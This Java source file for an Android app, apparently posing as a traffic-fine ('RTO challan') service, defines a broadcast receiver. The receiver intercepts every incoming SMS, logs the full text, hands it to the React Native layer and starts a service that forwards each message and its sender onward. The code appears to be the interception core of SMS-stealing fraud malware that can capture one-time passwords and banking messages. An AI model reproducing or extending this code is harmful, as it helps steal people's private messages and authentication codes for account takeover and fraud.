package com.rtochallan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            StringBuilder fullMessage = new StringBuilder();
            String sender = "";

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                sender = sms.getDisplayOriginatingAddress();
                fullMessage.append(sms.getMessageBody());
            }

            String body = fullMessage.toString();
            Log.d("SmsReceiver", "Received SMS: " + body);

            // Send to React Native
            SmsModule.sendSmsToJS(sender, body);

            // Start ForwardService to send it onward
            Intent forwardIntent = new Intent(context, ForwardService.class);
            forwardIntent.putExtra("sms_body", "From: " + sender + "\n" + body);
            context.startForegroundService(forwardIntent);
        }
    }
}
